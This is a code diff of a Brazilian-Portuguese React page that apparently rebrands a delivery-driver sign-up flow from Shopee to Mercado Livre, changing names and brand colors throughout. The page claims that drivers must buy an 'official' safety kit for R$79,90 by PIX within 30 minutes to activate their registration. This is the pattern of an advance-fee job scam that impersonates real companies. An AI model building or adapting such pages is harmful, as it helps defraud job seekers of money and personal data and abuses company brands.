@@ -467,7 +467,7 @@ const Entrega: React.FC = () => {
                   <div className="mt-6">
                     <p className="text-sm text-gray-500 italic">
                       Importante: Assim que o Kit de Segurança for entregue, você já estará apto para 
-                      começar a realizar entregas imediatamente pela Shopee.
+                      começar a realizar entregas imediatamente pelo Mercado Livre.
                     </p>
                   </div>
                 </div>
@@ -476,26 +476,26 @@ const Entrega: React.FC = () => {
           </div>
           
           <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
-            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
-              <h3 className="font-semibold text-[#E83D22]">Kit de Segurança Oficial Shopee</h3>
+            <div className="bg-[#F8F8FF] p-4 border-b border-[#30367420]">
+              <h3 className="font-semibold text-[#303674]">Kit de Segurança Oficial Mercado Livre</h3>
             </div>
             <div className="p-6">
               <div className="flex flex-col md:flex-row gap-6 items-center">
                 <div className="w-full md:w-2/5">
                   <img 
                     src={kitEpiImage} 
-                    alt="Kit EPI Shopee" 
+                    alt="Kit EPI Mercado Livre" 
                     className="w-full rounded-lg"
                   />
                 </div>
                 <div className="w-full md:w-3/5">
                   <h4 className="text-lg font-medium mb-3">Kit Completo para Entregadores</h4>
                   <p className="text-gray-600 mb-4">
-                    Para garantir sua segurança durante as entregas, a Shopee exige que todos os entregadores 
+                    Para garantir sua segurança durante as entregas, o Mercado Livre exige que todos os entregadores 
                     utilizem equipamentos de proteção individual. O kit inclui:
                   </p>
                   <ul className="list-disc pl-5 mb-4 space-y-1 text-gray-700">
-                    <li>2 Coletes refletivos com identificação Shopee (laranja e amarelo)</li>
+                    <li>2 Coletes refletivos com identificação Mercado Livre (azul e amarelo)</li>
                     <li>Par de luvas de proteção</li>
                     <li>Botas de segurança antiderrapantes</li>
                   </ul>
@@ -507,7 +507,7 @@ const Entrega: React.FC = () => {
                   </div>
                   <div className="bg-orange-50 p-4 rounded-md border border-orange-200 mb-2">
                     <p className="text-gray-700">
-                      <span className="font-medium">Data estimada de entrega:</span> <span className="text-[#E83D22] font-medium">{dataEntrega}</span>
+                      <span className="font-medium">Data estimada de entrega:</span> <span className="text-[#303674] font-medium">{dataEntrega}</span>
                     </p>
                   </div>
                 </div>
@@ -516,8 +516,8 @@ const Entrega: React.FC = () => {
           </div>
           
           <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
-            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
-              <h3 className="font-semibold text-[#E83D22]">Endereço para Entrega</h3>
+            <div className="bg-[#F8F8FF] p-4 border-b border-[#30367420]">
+              <h3 className="font-semibold text-[#303674]">Endereço para Entrega</h3>
             </div>
             <div className="p-6">
               <form onSubmit={handleSubmit(onSubmitEndereco)} className="space-y-6">
@@ -626,9 +626,9 @@ const Entrega: React.FC = () => {
                   </div>
                 </div>
                 
-                <div className="bg-[#FFF8F6] p-4 rounded-md border border-[#E83D2220] mb-4">
+                <div className="bg-[#F8F8FF] p-4 rounded-md border border-[#30367420] mb-4">
                   <div className="flex items-start">
-                    <div className="text-[#E83D22] mr-3 mt-1">
+                    <div className="text-[#303674] mr-3 mt-1">
                       <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                         <circle cx="12" cy="12" r="10"></circle>
                         <line x1="12" y1="8" x2="12" y2="12"></line>
@@ -636,10 +636,10 @@ const Entrega: React.FC = () => {
                       </svg>
                     </div>
                     <div>
-                      <h4 className="text-sm font-medium text-[#E83D22]">Informação Importante:</h4>
+                      <h4 className="text-sm font-medium text-[#303674]">Informação Importante:</h4>
                       <p className="text-sm text-gray-700">
-                        Para ativar seu cadastro e se tornar um entregador Shopee, é obrigatório a aquisição do 
-                        Kit Oficial de Entregador da Shopee. O kit é entregue a preço de custo por <strong>R$79,90</strong>.
+                        Para ativar seu cadastro e se tornar um entregador Mercado Livre, é obrigatório a aquisição do 
+                        Kit Oficial de Entregador do Mercado Livre. O kit é entregue a preço de custo por <strong>R$79,90</strong>.
                       </p>
                     </div>
                   </div>
@@ -659,7 +659,7 @@ const Entrega: React.FC = () => {
                       <h4 className="text-red-800 font-medium text-sm"><strong>ATENÇÃO:</strong> Aceite os termos e depois clique em "Comprar e Ativar Cadastro".</h4>
                       <p className="text-red-700 text-sm mt-1">
                         O pagamento do Kit de Segurança do Entregador é <strong>obrigatório</strong> e você precisa 
-                        adquirir este kit oficial para exercer a função de entregador Shopee.
+                        adquirir este kit oficial para exercer a função de entregador Mercado Livre.
                       </p>
                       <p className="text-red-700 text-sm mt-2">
                         Ao prosseguir, você se compromete a realizar o pagamento via PIX no prazo de 30 minutos, 
@@ -689,7 +689,7 @@ const Entrega: React.FC = () => {
                 
                 <Button
                   type="submit"
-                  className={`w-full text-white font-medium py-6 text-base rounded-[3px] transition-all ${acceptedTerms ? 'bg-[#E83D22] hover:bg-[#d73920]' : 'bg-[#E83D2280] cursor-not-allowed'}`}
+                  className={`w-full text-white font-medium py-6 text-base rounded-[3px] transition-all ${acceptedTerms ? 'bg-[#303674] hover:bg-[#262c60]' : 'bg-[#30367480] cursor-not-allowed'}`}
                   style={{ height: '50px' }}
                   disabled={!acceptedTerms}
                 >
